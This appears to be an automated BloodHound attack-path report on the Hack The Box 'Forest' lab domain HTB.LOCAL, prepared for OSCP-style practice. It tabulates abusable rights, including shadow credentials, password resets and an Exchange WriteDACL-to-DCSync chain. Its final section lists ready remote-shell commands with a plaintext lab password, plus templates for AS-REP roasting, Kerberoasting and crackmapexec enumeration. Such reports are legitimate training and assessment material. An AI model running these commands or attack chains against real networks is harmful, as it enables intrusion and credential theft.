| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ENTERPRISE ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |

### [OK] AddKeyCredentialLink (Shadow Credentials)
**OSCP Relevance:** MEDIUM | **Results:** 60

> Find principals with AddKeyCredentialLink permission. Can add msDS-KeyCredentialLink for certificate-based auth without knowing password.

| Attacker | AttackerType | Target | TargetType |
| --- | --- | --- | --- |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SANTI@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SANTI@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | ANDY@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | ANDY@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | MARK@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | MARK@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | LUCINDA@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | LUCINDA@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SEBASTIEN@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SEBASTIEN@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX0659CC1@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX0659CC1@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXB01AC64@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXB01AC64@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX7108A4E@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX7108A4E@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFD87238@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFD87238@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX83D6781@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX83D6781@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX6DED678@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX6DED678@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX968E74D@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX968E74D@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX670628E@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOX670628E@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC0A90C9@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC0A90C9@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC3D7722@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | HEALTHMAILBOXC3D7722@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_7C96B981967141EBB@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_7C96B981967141EBB@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1FFAB36A2F5F479CB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1FFAB36A2F5F479CB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_C75EE099D0A64C91B@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_C75EE099D0A64C91B@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_9B69F1B9D2CC45549@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_9B69F1B9D2CC45549@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_75A538D3025E4DB9A@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_75A538D3025E4DB9A@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1B41C9286325456BB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_1B41C9286325456BB@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_681F53D4942840E18@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_681F53D4942840E18@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | $331000-VK4ADACQNUCA@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | $331000-VK4ADACQNUCA@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | DEFAULTACCOUNT@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | DEFAULTACCOUNT@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_CA8C2ED5BDAB4DC9B@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_CA8C2ED5BDAB4DC9B@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | SM_2C8EEF0A09B545ACB@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | SM_2C8EEF0A09B545ACB@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | GUEST@HTB.LOCAL | ['User'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | GUEST@HTB.LOCAL | ['User'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | EXCH01.HTB.LOCAL | ['Computer'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | EXCH01.HTB.LOCAL | ['Computer'] |
| KEY ADMINS@HTB.LOCAL | ['Group'] | FOREST.HTB.LOCAL | ['Computer'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] | FOREST.HTB.LOCAL | ['Computer'] |

### [OK] ForceChangePassword Rights
**OSCP Relevance:** MEDIUM | **Results:** 27

> Find principals who can reset passwords without knowing current password. Direct credential compromise.

| Attacker | CanResetPassword | VictimIsPrivileged |
| --- | --- | --- |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SANTI@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ANDY@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | MARK@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | LUCINDA@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SEBASTIEN@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |

### [OK] AddMember to Privileged Groups
**OSCP Relevance:** MEDIUM | **Results:** 12

> Find principals who can add members to privileged groups. Direct path to privilege escalation.

| Attacker | CanAddMembersTo |
| --- | --- |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL |
| EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DNSADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL |

### [OK] Owns Relationships on Users/Groups
**OSCP Relevance:** MEDIUM | **Results:** 26

> Find principals who own other users or groups. Owner can grant themselves full control.

| Owner | OwnedObject | ObjectType |
| --- | --- | --- |
| DOMAIN ADMINS@HTB.LOCAL | SVC-ALFRESCO@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | KRBTGT@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATOR@HTB.LOCAL | ['User'] |
| DOMAIN ADMINS@HTB.LOCAL | PRIVILEGED IT ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVICE ACCOUNTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SECURITY ADMINISTRATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | READ-ONLY DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | CLONEABLE DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SERVER OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN GUESTS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN USERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | SCHEMA ADMINS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | DOMAIN COMPUTERS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | STORAGE REPLICA ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| ADMINISTRATORS@HTB.LOCAL | HYPER-V ADMINISTRATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | REPLICATOR@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | BACKUP OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | PRINT OPERATORS@HTB.LOCAL | ['Group'] |
| DOMAIN ADMINS@HTB.LOCAL | ADMINISTRATORS@HTB.LOCAL | ['Group'] |

### [-] GPO Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] OU Control for Object Manipulation
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] AllExtendedRights Enumeration
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Read LAPS Password Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] All Domain Admins
**OSCP Relevance:** MEDIUM | **Results:** 1

> List all members of Domain Admins group (including nested membership). Know your targets.

| DomainAdmin | Enabled | AdminCount |
| --- | --- | --- |
| ADMINISTRATOR@HTB.LOCAL | True | True |

### [OK] GenericWrite on Users
**OSCP Relevance:** MEDIUM | **Results:** 22

> Find principals with GenericWrite on users. Can modify SPN for Kerberoasting or set logon script.

| Attacker | Victim | VictimIsPrivileged |
| --- | --- | --- |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |

### [-] WriteSPN for Targeted Kerberoasting
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] WriteAccountRestrictions for RBCD
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] SyncLAPSPassword Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] AddAllowedToAct Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] DCSync (Composite Check)
**OSCP Relevance:** MEDIUM | **Results:** None

### Check Account Operators Membership
*Skipped - requires variables: USER*

### [OK] Check Exchange WriteDACL on Domain
**OSCP Relevance:** MEDIUM | **Results:** 1

> Check if Exchange Windows Permissions group has WriteDACL on the domain. This is the prerequisite for the Exchange WriteDACL to DCSync attack chain.

| ExchangeGroup | Domain | AttackPotential |
| --- | --- | --- |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HTB.LOCAL | Can grant DCSync rights via WriteDACL |

### Check Backup Operators Membership
*Skipped - requires variables: USER*

### Check Server Operators Membership
*Skipped - requires variables: USER*

### Check AddMember to Specific Group
*Skipped - requires variables: USER, TARGET_GROUP*

---

## Attack Chains

### [-] Full Attack Path: Owned User -> Pivot -> DA
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Shortest Path to Domain Admins
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] All Paths to Domain Admin (Multi-Hop)
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Credential Harvest Opportunities
**OSCP Relevance:** MEDIUM | **Results:** None

### Find Paths Through Specific Computer
*Skipped - requires variables: COMPUTER*

### Shortest Path Between Two Users
*Skipped - requires variables: SOURCE_USER, TARGET_USER*

### [-] Path to High-Value Targets
**OSCP Relevance:** MEDIUM | **Results:** None

### [-] Circular Group Memberships
**OSCP Relevance:** MEDIUM | **Results:** None

---

## Owned Principal

### What Can Owned User Access?
*Skipped - requires variables: USER*

### Quick Wins from Owned User Context
*Skipped - requires variables: USER*

### Path to DA from Owned User
*Skipped - requires variables: USER*

### Owned User Group Memberships
*Skipped - requires variables: USER*

### Outbound Object Control from Owned
*Skipped - requires variables: USER*

### First Hop Lateral Movement
*Skipped - requires variables: USER*

### Kerberoastable from Owned Context
*Skipped - requires variables: USER*

### [OK] AS-REP Targets from Owned Context
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find AS-REP roastable accounts. These can be attacked without any additional access.

| User | IsPrivileged | Description |
| --- | --- | --- |
| SVC-ALFRESCO@HTB.LOCAL | True |  |

### Session Harvest Opportunities
*Skipped - requires variables: USER*

### Chained Privilege Escalation
*Skipped - requires variables: USER*

---

## Operational

### [OK] Computers by Operating System (Find Legacy)
**OSCP Relevance:** MEDIUM | **Results:** 1

> Enumerate computers grouped by OS. Legacy systems (2008, 2003, XP) are often more vulnerable.

| OS | Computers | Count |
| --- | --- | --- |
| Windows Server 2016 Standard | ['EXCH01.HTB.LOCAL', 'FOREST.HTB.LOCAL'] | 2 |

### [-] Legacy Windows Systems
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] Password Age Distribution
**OSCP Relevance:** MEDIUM | **Results:** 18

> Find users with old passwords. Old passwords may be weak or appear in breach databases.

| User | PasswordLastSet | IsPrivileged | Description |
| --- | --- | --- | --- |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX670628E@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL | 6 years ago | False |  |
| SEBASTIEN@HTB.LOCAL | 6 years ago | False |  |
| LUCINDA@HTB.LOCAL | 6 years ago | False |  |
| MARK@HTB.LOCAL | 6 years ago | False |  |
| SANTI@HTB.LOCAL | 6 years ago | False |  |
| ANDY@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXC3D7722@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXFC9DAAD@HTB.LOCAL | 6 years ago | False |  |
| ADMINISTRATOR@HTB.LOCAL | 4 years ago | True | Built-in account for administering the computer/domain |
| SVC-ALFRESCO@HTB.LOCAL | 16 days ago | True |  |

### [OK] Inactive User Accounts
**OSCP Relevance:** MEDIUM | **Results:** 5

> Find enabled users who haven't logged in recently. May have default or forgotten passwords.

| User | LastLogon | Description |
| --- | --- | --- |
| SEBASTIEN@HTB.LOCAL | 6 years ago |  |
| HEALTHMAILBOXFC9DAAD@HTB.LOCAL | 6 years ago |  |
| HEALTHMAILBOXC3D7722@HTB.LOCAL | 6 years ago |  |
| ADMINISTRATOR@HTB.LOCAL | 16 days ago | Built-in account for administering the computer/domain |
| SVC-ALFRESCO@HTB.LOCAL | 16 days ago |  |

### [OK] Enabled vs Disabled Account Ratio
**OSCP Relevance:** MEDIUM | **Results:** 2

> Count enabled vs disabled accounts. High disabled count may indicate account churn.

| Enabled | Count |
| --- | --- |
| True | 18 |
| False | 14 |

### [-] Domain Trust Relationships
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] Relationship Count by Type
**OSCP Relevance:** MEDIUM | **Results:** 14

> Count all relationship types in the database. Helps understand AD structure and attack surface.

| Relationship | Count |
| --- | --- |
| GenericAll | 597 |
| WriteDacl | 452 |
| GenericWrite | 315 |
| WriteOwner | 277 |
| Owns | 209 |
| AddMember | 156 |
| AddKeyCredentialLink | 120 |
| AllExtendedRights | 78 |
| ForceChangePassword | 78 |
| MemberOf | 74 |
| AdminTo | 6 |
| GetChanges | 6 |
| GetChangesAll | 4 |
| CanPSRemote | 2 |

### [OK] High-Value Target Summary
**OSCP Relevance:** MEDIUM | **Results:** 9

> List all objects marked as high-value in BloodHound. Primary targets for attack planning.

| Target | Type | Description |
| --- | --- | --- |
| HTB.LOCAL | ['Domain'] |  |
| ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] | Members can administer domain user and group accounts |
| ADMINISTRATORS@HTB.LOCAL | ['Group'] | Administrators have complete and unrestricted access to the computer/domain |
| BACKUP OPERATORS@HTB.LOCAL | ['Group'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| DOMAIN ADMINS@HTB.LOCAL | ['Group'] | Designated administrators of the domain |
| DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | All domain controllers in the domain |
| ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] | Designated administrators of the enterprise |
| PRINT OPERATORS@HTB.LOCAL | ['Group'] | Members can administer printers installed on domain controllers |
| SERVER OPERATORS@HTB.LOCAL | ['Group'] | Members can administer domain servers |

---

## Summary

| Metric | Count |
| ------ | ----- |
| Total Queries | 79 |
| With Results | 27 |
| No Results | 34 |
| Skipped | 18 |
| Failed | 0 |

### Key Findings



## 🎯 Pwned User Attack Paths

### SVC-ALFRESCO@HTB.LOCAL
**Credential:** password

#### User-Level Access (1 machines)

**FOREST.HTB.LOCAL**

| Technique | Command |
|-----------|---------|
| evil-winrm | `evil-winrm -i FOREST.HTB.LOCAL -u SVC-ALFRESCO -p 's3rvice'` |
| winrs | `winrs -r:FOREST.HTB.LOCAL -u:htb.local\SVC-ALFRESCO -p:s3rvice cmd` |

#### Authenticated User Attacks (Any Domain User)

Replace placeholders with your credentials:

| Attack | Command Template |
|--------|------------------|
| AS-REP Roasting ⚡ | `impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| Kerberoasting ⚡ | `impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| BloodHound Collection ⚡ | `bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>` |
| Domain User Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users` |
| Domain Admins Members | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'` |
| Share Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares` |
